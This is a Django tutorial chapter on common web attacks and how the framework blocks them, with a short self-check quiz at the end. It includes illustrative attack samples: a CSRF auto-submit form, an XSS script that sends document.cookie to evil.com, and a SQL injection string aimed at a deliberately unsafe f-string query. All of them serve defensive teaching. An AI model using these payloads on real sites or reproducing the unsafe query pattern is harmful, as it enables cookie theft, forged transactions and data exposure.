Django is **secure by default**: many attacks are blocked without you writing a line. But you can still switch protections off by accident. This chapter explains the most common web attacks, how Django stops each one, and the mistakes that undo that protection.

## CSRF: Cross-Site Request Forgery

### The attack

You're logged into `bank.com`. In another tab you open `evil.com`, which contains:

```html
<form action="https://bank.com/transfer/" method="post">
  <input type="hidden" name="to" value="attacker">
  <input type="hidden" name="amount" value="50000">
</form>
<script>document.forms[0].submit()</script>
```

Your browser sends the request **with your bank cookies attached**, so it looks like you made it. That's CSRF: tricking a logged-in user's browser into submitting a request they never intended.

### Django's defence

`CsrfViewMiddleware` (on by default) requires every **unsafe** request (POST, PUT, PATCH, DELETE) to carry a secret token that only your own pages know.

```django
<form method="post">
  {% csrf_token %}
  ...
</form>
```

`{% csrf_token %}` renders a hidden input:

```html
<input type="hidden" name="csrfmiddlewaretoken" value="u7Rk...random...">
```

Django sets a matching value in a `csrftoken` cookie. On submission, it compares the two. `evil.com` can make your browser *send* the cookie, but it can't *read* it or your page, so it can't produce the matching form value. A missing or wrong token gives:

```text
Forbidden (403)
CSRF verification failed. Request aborted.
```

### Rules

- Put `{% csrf_token %}` **inside** every `<form method="post">`.
- GET forms (like search) don't need it, because GET must never change data.
- The template must be rendered with `render()` (which passes `request`) for the tag to work.
- Over HTTPS, Django also checks the `Origin`/`Referer` header. If your site sits behind another domain or you get *"Origin checking failed"*, add it to `CSRF_TRUSTED_ORIGINS = ["https://example.com"]`.

### CSRF with JavaScript (fetch / AJAX)

Read the token from the cookie and send it in the `X-CSRFToken` header:

```javascript
function getCookie(name) {
  return document.cookie
    .split("; ")
    .find((row) => row.startsWith(name + "="))
    ?.split("=")[1];
}

fetch("/api/like/7/", {
  method: "POST",
  headers: { "X-CSRFToken": getCookie("csrftoken") },
});
```

### csrf_exempt

```python
from django.views.decorators.csrf import csrf_exempt

@csrf_exempt
def payment_webhook(request): ...
```

Only for endpoints that are called by **other servers**, not browsers (e.g. a payment provider's webhook), and that verify requests another way, such as a signature. APIs that use token authentication (JWT) in a header aren't vulnerable to CSRF in the same way, because the browser doesn't attach those headers automatically.

> [!EXAM] CSRF in one breath
> CSRF tricks a logged-in user's browser into sending an unwanted request. Django blocks it with `CsrfViewMiddleware`, which requires a secret token, added to forms with `{% csrf_token %}`, on every POST. Missing token → **403 Forbidden**.

## XSS: Cross-Site Scripting

### The attack

A user posts a comment containing:

```html
<script>fetch("https://evil.com/steal?c=" + document.cookie)</script>
```

If your page outputs it raw, that script runs in every visitor's browser.

### Django's defence: auto-escaping

Every `{{ variable }}` is escaped: `<` becomes `&lt;`, `>` becomes `&gt;`, quotes are escaped too. The browser shows the text instead of running it.

### How people break it

```django
{{ comment.text|safe }}                  {# DANGER if it contains user input #}
{% autoescape off %}{{ bio }}{% endautoescape %}   {# same danger #}
```

```python
from django.utils.safestring import mark_safe
mark_safe(user_input)                    # DANGER
```

Only mark content safe if *you* produced it. To allow users some formatting, use Markdown with a sanitiser (e.g. the `nh3` library) that strips dangerous tags.

Other XSS tips:

- Quote HTML attributes: `<a title="{{ x }}">`, never `<a title={{ x }}>`.
- To pass data to JavaScript, use the `json_script` filter instead of pasting values into a `<script>`:

```django
{{ chart_data|json_script:"chart-data" }}
<script>
  const data = JSON.parse(document.getElementById("chart-data").textContent);
</script>
```

- Session cookies are `HttpOnly` by default, so injected scripts can't read them.
- A **Content Security Policy** header restricts where scripts can load from. Django 6.0 adds built-in CSP support (`ContentSecurityPolicyMiddleware` and the `SECURE_CSP` setting); on older versions use the `django-csp` package.

## SQL injection

### The attack

```python
# NEVER do this
name = request.GET["name"]
cursor.execute(f"SELECT * FROM players WHERE name = '{name}'")
```

If `name` is `' OR '1'='1`, the query returns every row. Worse inputs can delete tables.

### Django's defence

The ORM always sends values separately from the SQL (*parameterised queries*), so input can never become code:

```python
Player.objects.filter(name=name)   # safe
```

When you write raw SQL, use parameters too:

```python
Player.objects.raw("SELECT * FROM cricket_player WHERE name = %s", [name])   # safe
cursor.execute("SELECT * FROM cricket_player WHERE name = %s", [name])       # safe
```

Never use f-strings, `%` formatting or `+` to put values into SQL. Also be careful with `extra()` and `RawSQL()`.

## Clickjacking

### The attack

A malicious site loads your page in an invisible `<iframe>` and tricks users into clicking your "Delete account" button while they think they're clicking something else.

### Django's defence

`XFrameOptionsMiddleware` sends `X-Frame-Options: DENY`, telling browsers not to display your pages inside frames on other sites. If you genuinely need framing on your own domain, use `X_FRAME_OPTIONS = "SAMEORIGIN"` or `@xframe_options_sameorigin` on specific views.

## Mass assignment

```python
class ProfileForm(forms.ModelForm):
    class Meta:
        model = User
        fields = "__all__"      # DANGER: includes is_staff and is_superuser!
```

A user could add `is_superuser=on` to the POST data. **Always list fields explicitly** in ModelForms and DRF serializers.

## Host header attacks

Django uses the `Host` header to build absolute URLs (e.g. in password reset emails). `ALLOWED_HOSTS` rejects requests for domains you don't serve:

```python
ALLOWED_HOSTS = ["example.com", "www.example.com"]
```

## Passwords and accounts

- Passwords are hashed with PBKDF2 by default. Never store or log them in plain text.
- Keep `AUTH_PASSWORD_VALIDATORS` enabled.
- Limit login attempts to slow down guessing (e.g. the `django-axes` package, or DRF throttling for APIs).
- Login and password reset forms don't reveal whether an account exists.

## File uploads

- Validate size and extension; `ImageField` verifies files are images.
- Serve user uploads from a separate domain or storage service if possible.
- Never trust a file's name or content type, and never execute uploaded files.

## Secrets and settings

```python title="settings.py"
import os

SECRET_KEY = os.environ["DJANGO_SECRET_KEY"]
DEBUG = os.environ.get("DJANGO_DEBUG") == "1"
```

- `SECRET_KEY` signs sessions, password reset tokens and CSRF tokens. Leaked = attackers can forge them. Keep it out of Git.
- `DEBUG = False` in production. Debug pages expose code and settings.
- Store database passwords and API keys in environment variables or a secrets manager.

## HTTPS settings for production

```python title="settings.py (production)"
SECURE_SSL_REDIRECT = True               # redirect http:// to https://
SESSION_COOKIE_SECURE = True             # session cookie only over HTTPS
CSRF_COOKIE_SECURE = True                # CSRF cookie only over HTTPS
SECURE_HSTS_SECONDS = 31536000           # tell browsers: HTTPS only, for a year
SECURE_HSTS_INCLUDE_SUBDOMAINS = True
SECURE_HSTS_PRELOAD = True
SECURE_PROXY_SSL_HEADER = ("HTTP_X_FORWARDED_PROTO", "https")   # if behind a proxy that sets it
```

> [!CAUTION]
> Start with a small `SECURE_HSTS_SECONDS` (e.g. `3600`) and increase it once you're sure HTTPS works everywhere. Browsers remember HSTS and will refuse plain HTTP for that long.

## Let Django check for you

```bash
python manage.py check --deploy
```

This lists security settings that are missing or weak for production. Run it before every deployment.

## Summary

| Attack | Django's protection | How to break it (don't) |
|---|---|---|
| CSRF | `CsrfViewMiddleware` + `{% csrf_token %}` | Forgetting the tag, `@csrf_exempt` |
| XSS | Template auto-escaping | `\|safe`, `mark_safe`, `autoescape off` on user input |
| SQL injection | Parameterised ORM queries | f-strings in raw SQL |
| Clickjacking | `XFrameOptionsMiddleware` | Removing the middleware |
| Mass assignment | Explicit `fields` | `fields = "__all__"` |
| Host header | `ALLOWED_HOSTS` | `ALLOWED_HOSTS = ["*"]` |
| Session theft | HttpOnly + Secure cookies, HTTPS | `DEBUG = True`, plain HTTP |

## Check yourself

<details>
<summary>What does <code>{% csrf_token %}</code> output, and where must it go?</summary>

A hidden input named `csrfmiddlewaretoken` containing a secret token. It must be inside every `<form method="post">`.
</details>

<details>
<summary>Why is <code>{{ user_comment }}</code> safe but <code>{{ user_comment|safe }}</code> dangerous?</summary>

The first is auto-escaped so any HTML or script is displayed as text. `|safe` disables escaping, so a script in the comment would run in visitors' browsers (XSS).
</details>

<details>
<summary>How do you pass a user-supplied value into a raw SQL query safely?</summary>

As a parameter: `cursor.execute("... WHERE name = %s", [name])`. Never format it into the SQL string.
</details>

<details>
<summary>Which command lists missing production security settings?</summary>

`python manage.py check --deploy`
</details>
